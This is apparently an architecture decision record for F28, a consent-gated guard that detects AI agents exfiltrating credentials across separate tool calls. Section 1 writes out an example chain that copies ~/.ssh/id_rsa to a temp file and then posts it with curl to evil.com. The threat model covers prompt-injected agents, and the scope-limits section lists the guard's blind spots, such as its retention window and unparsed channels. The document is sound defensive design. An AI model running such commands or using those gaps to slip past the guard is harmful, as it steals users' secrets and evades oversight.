# ADR-037 · F28 `taint-egress-consent` · Staged / Cross-Call Credential Exfiltration Detection

| Field             | Value |
|---|---|
| Floor             | F28 |
| Rung              | 18.65 |
| Name              | `taint-egress-consent` |
| Code              | `F28_TAINT_EGRESS` |
| Action            | escalate → `consent-required` |
| Tier              | `demotable` — `demotableBy: ["consent:interactive"]` |
| Status            | Implemented |
| Decision date     | 2026-06-05 |
| Severity          | Critical |

---

## 1. Problem statement

ADR-036 / F27 (`runtime/floor-secret-egress.js`) closes **single-call** credential exfiltration only —
where the secret signal and the external egress appear in the **same** tool call. It **explicitly
deferred** staged / cross-call exfil to ADR-037 (ADR-036 §Scope Limit, Deferred Seams).

The realistic attack that ADR-036 left open:

1. **Call A** — read `~/.ssh/id_rsa` (or similar credential) into an innocuous temp file:
   `cp ~/.ssh/id_rsa /tmp/x` or `cat ~/.ssh/id_rsa > /tmp/x`
2. **Call B** — egress the temp file to an external host: `curl -d @/tmp/x https://evil.com/collect`

F27 does **not** fire: no secret-signal AND external-egress in the same call. F23's staged-exfil
kill-chain detects this shape but ships observe-only by default (`LILARA_KILL_CHAIN_ENFORCE=1` to
enforce), and even when enforced it returns a **hard inviolable BLOCK** — no stop-and-ask, no scope.

ADR-037 closes this gap deterministically and opt-in, routing it to the **consent / ESCALATE** tier:
stop-and-ask with **REAL args** (the tainted file, the destination host). Approve ⇒ scoped grant,
no re-ask in scope. Deny / no-TTY / unattended ⇒ fail-closed block + one-way notify.

### North star
> Security must speed up safely. Do not add interruptions for in-scope, already-approved flows.
> Ask once with real evidence; an approved (file, host) scope must not re-ask.

---

## 2. Threat model

### Actor A — curious / instructed agent
An agent with access to a user's machine is instructed (or manipulated) to stage credential data
through an intermediary file before exfiltrating it, to avoid the single-call F27 detection.

### Actor B — malicious instruction (prompt injection)
A prompt-injected instruction causes the agent to read a credential path and then, in a subsequent
call, egress the intermediary file.

### Detection posture (action-evidence only)
Decisions are made on **action-evidence only** — the file path hash present in the provenance graph
AND a matching egress target in the pending call. Never on suspicion, ownership inference, or content
classification alone. Temporal-only correlation (time-proximity without structural or hash-overlap
evidence) **never fires** — too FP-prone on legitimate dev flows.

---

## 3. Why ESCALATE, not inviolable

**ADR-036 invariant #6 (preserved verbatim):**
> Inviolable floors decide on single-call action-evidence only — never cross-call session state
> (taint-elevation is explicitly excluded and deferred to ADR-037).

Cross-call detection requires injecting provenance state from a prior call into the current decision.
Binding that to an inviolable floor would make inviolable decisions replay-fragile and session-state-
dependent — the named anti-pattern. Therefore:

- F28 is `tier: "demotable"`, `demotableBy: ["consent:interactive"]`.
- F27 and F23 remain inviolable and structurally independent.
- `INVIOLABLE_FLOOR_IDS` (auto-derived from `demotableBy.length === 0`) does **not** include F28.

---

## 4. Why a new floor, not extending F23

F23 (`data-flow-kill-chain`, rung 18.6) is `tier: "inviolable"`, `demotableBy: []`. Making it
consent-eligible would require setting `demotableBy` non-empty, which:
(a) flips F23 out of `INVIOLABLE_FLOOR_IDS` (auto-derived); and
(b) trips `assertOrdered`'s hard check that `tier:"inviolable"` ⇏ non-empty `demotableBy`.

This would weaken **all three** F23 chain shapes (staged-exfil, injection-to-exec, persistence) and
the full F23 "sensitive" class — a large, unwanted blast radius. F28 as a **third sibling** alongside
F27 is the correct decomposition: narrow, purpose-built, consent-eligible, credential-class-only.

**Relationship to F23:**
F28 **wraps** F23's provenance-graph substrate (`runtime/provenance-graph.js` pure helpers) and
**supersedes F23's staged-exfil BLOCK for the credential sub-class only** — routing to consent
instead of hard block. F23 retains full ownership of the non-credential sensitive class and the
other two chain shapes (injection-to-exec, persistence).

---

## 5. Determinism and replay invariant

**Hard constraint (preserved):** `decide()` is pure and byte-identical-replayable. Cross-call /
taint state must be **injected** via `input.*`, never read from disk inside `decide()`.

### Injection pattern
`pretool-gate.js` loads `loadProvenanceGraph()` at the impure boundary and injects the result as
`input.provenanceGraph` — gated on `LILARA_TAINT_EGRESS=1`. The canonical pattern:
```
let provenanceGraph = null;
if (process.env.LILARA_TAINT_EGRESS === "1") {
  provenanceGraph = _requireSessionContext().loadProvenanceGraph();
}
decide({ ..., provenanceGraph });
```

### Inertness proof (feature off)
- Replay calls `decide(e.input)` directly with corpus entries that **never** include `provenanceGraph`.
- `evalTaintEgressFloor` first line: `if (!Array.isArray(graph) || graph.length === 0) return {fired:false}`.
- Decision-engine guard: `if (process.env.LILARA_TAINT_EGRESS === "1")` — not set in replay.
- Either guard alone makes `_f28Detail = null` → late-override block skipped → result/journal
  additive fields absent → byte-identical.

### F23 injection alignment
`floor-f23.js` now honors the injected graph:
```
const _f23Graph = (input && input.provenanceGraph != null)
  ? input.provenanceGraph
  : _loadProvenanceGraph();
```
Under replay `input.provenanceGraph == null` → identical loader branch as today → no-op. This
**narrows** the pre-existing in-decide-load determinism gap; it never widens it.

---

## 6. Taint class and signals

F28 fires **only** on the F27-narrow credential class:
- `CRED_PATH_PATTERNS` (exported from `runtime/floor-secret-egress.js`): 11 regexes for `.ssh`,
  `.aws`, `.gnupg`, `.kube`, `id_rsa`, etc. — paths where a read directly exposes secrets.
- Inline `scanSecrets` hits (26 named regexes from `claude/hooks/secret-patterns.json`).

F28 deliberately **excludes** the broader F23 "sensitive" set (payments/billing/.env/prod paths).
Those remain F23's inviolable remit. The credential class is the concrete exfil threat.

### credClass tagging (recording side, outside decide())
At `PostToolUse` (`runtime/post-adapter-factory.js`), when a sensitive source node is recorded AND
`LILARA_TAINT_EGRESS=1`, an additive `credClass: true` field is set on the node when the file path
matches `CRED_PATH_PATTERNS` or the content triggers `scanSecrets`.

At `decide()` propagation (`runtime/floor-f23.js`), when a derivative node is recorded (secret →
temp file write), `credClass: true` is propagated from the source node — also gated on the flag.

**When the flag is off:** no `credClass` field is ever written — provenance-graph.json is
byte-identical to today.

---

## 7. Sink classification and evidence bar

### Sink
Reuses `provenance-graph.classifySink(ir)` — fires only on `kind === "network-send"` with a
non-exempt target. Same loopback / private-IP / package-registry exemption as F18/F23.

### Evidence arm 1: structural (preferred)
An `@file` ref in the egress command matches a credential-class graph node:
- `node.targetPathHash === pathHash(ref)` — the "secret → write → temp file" derivative
- `node.pathHash === pathHash(ref)` — direct egress of a credential path that was read

### Evidence arm 2: content-hash overlap
Command token hashes overlap a credential-class source node's `tokenHashes` (Jaccard ≥ 0.08,
sharedCount ≥ 3). Same bar as `provenance-graph.js`. **Temporal-only never fires.**

---

## 8. ESCALATE + consent wiring

### Grant model: bespoke (file, host) scope
F28 is a **scope-shaped** floor (not in `ONE_SHOT_FLOORS`). On approve:
1. `_deriveGrantScopes(prompt)` emits `scopes.taintEgress = [{host, filePathHash}]`.
2. `mintConsentGrant(grantScopes, {...})` stores the grant (JSONL, 0600, 1-hour TTL).
3. On the next call to `evalTaintEgressFloor`, it reads `input.consentGrant.scopes.taintEgress`
   and returns `{fired: false}` when the exact `{host, filePathHash}` pair matches.

This bypasses the general `scopesMatch` engine (which has no network branch) by doing the
suppression check **inside the predicate** with the injected grant. Re-asks only when the
file or destination host changes.

### Fail-closed paths
- `LILARA_CONSENT` off / unset → `consent-required` collapses to `block` (`pretool-gate.js:343-351`).
- Deny / no-TTY / headless → `requestConsent` returns `deny` → exit 2 + one-way notify.
- Unknown mode → `requestConsent` fails closed (deny).

### Prompt fields (REAL args only)
`buildConsentPrompt` reads `decision.networkEgress.hostname` (the destination host) and
`decision.taintEgress.taintedFilePath` + `decision.taintEgress.credClass` (both from the F28 receipt,
which is built from decision-engine inspection of the provenance graph + IR — never from agent
self-description). The TTY-only transport invariant is untouched.

---

## 9. Scope limits (known gaps — not silent)

### Single-call within staged
F27 still owns single-call credential egress. F28 requires a recorded prior source node — if the
agent skips the intermediate file (performs the two actions in one Bash command), F27 fires, not F28.

### 5-minute / 40-node graph retention
Provenance nodes older than 5 minutes or pushed out by > 40 newer nodes won't match. A staged exfil
that spans > 5 min, or a session with > 40 intervening source-recording calls, won't be caught.
Accepted: same limitation as F23. Document; don't change (widening would increase FP risk).

### Egress coverage bound (same as F18/F27)
F28 sees only the egress channels that `classifySink` / `network-egress.js` recognises: URL-scheme
(`https/ftp/ssh/git/sftp/etc.`) + bare-host args to `{curl, wget, http, https, httpie, xh}`. Channels
not parsed (some scp/rsync forms, DNS tunneling via command names not in `HOST_BIN_TOKENS`) won't trip
F28 — under-coverage, same fail-direction as F18/F27 (never a false sense of completeness).

### PostToolUse dispatch
`credClass` tagging depends on `PostToolUse` firing and surfacing the file content at call A. Per-harness
MCP dispatch reliability caveats (see `post-adapter-factory.js` block 2d) apply to F28 as well. Fail-open
— missed tagging means F28 doesn't fire for that chain, but F27 and F23-enforce remain independent backstops.

### Flag coupling at record time
If `LILARA_TAINT_EGRESS` is off at call A (no `credClass` tag written) but on at call B, F28 will not
fire for that chain — fail-open, no false sense of coverage. The expected usage model is: flag stays
constant across a session.

---

## 10. Activation

```
LILARA_TAINT_EGRESS=1          # enable detection + injection (default off)
LILARA_CONSENT=interactive     # enable stop-and-ask (else consent-required → block)
```

When `LILARA_TAINT_EGRESS` is unset / off:
- No `provenanceGraph` is injected → `evalTaintEgressFloor` returns `{fired:false}` immediately.
- No `credClass` fields are written to provenance-graph.json.
- `_f28Detail = null` → result/journal are byte-identical to today.
- All ~55 CI gates and the full replay corpus pass with **zero divergence**.

---

## 11. Deferred seams (build nothing here)

| Seam | Notes |
|---|---|
| Broader taint classes | Payments/billing/.env/prod remain F23's inviolable remit. Adding them to F28 increases FP risk. |
| Wider egress coverage | scp/rsync/DNS-tunnel forms — same bound as F18/F27. A future ADR can extend `network-egress.js`. |
| Cross-session taint | Provenance graph is session-scoped (5-min TTL). Multi-session taint is a separate ADR. |
| Inbound channels | Telegram/WhatsApp/MCP inbound — ADR-034 seam, not ADR-037. |
| Distribution / deletion coordination | Sibling tasks, separate ADRs. |

---

## 12. Alternatives considered

### Option A: Extend F23 to consent-eligible
Rejected — flips F23 out of `INVIOLABLE_FLOOR_IDS`; weakens all three chain shapes and the full
sensitive class; trips `assertOrdered`. Blast radius unacceptable.

### Option B: Extend F27 (cross-call)
Rejected — F27 is inviolable rung 15.5, `demotableBy:[]`; making it consent-eligible has the same
invariant problem. F27 is intentionally single-call-only (its own scope comment).

### Option C (chosen): New floor F28, ESCALATE, demotable
Narrow, purpose-built, credential-class-only. Wraps F23's provenance substrate. Supersedes F23's
block for the credential sub-class by routing to consent. F23 and F27 stay intact.

### Grant: one-shot vs bespoke scope
One-shot (like F4/F19) would re-ask every time — inconsistent with the north star
"approved scope must not re-ask." Bespoke `(file, host)` scope was chosen: narrow blast radius,
no changes to the general `scopesMatch` engine (which has no network branch), inherits all TTY-only
and forged-in-band-approve defenses from the ADR-035 transport.
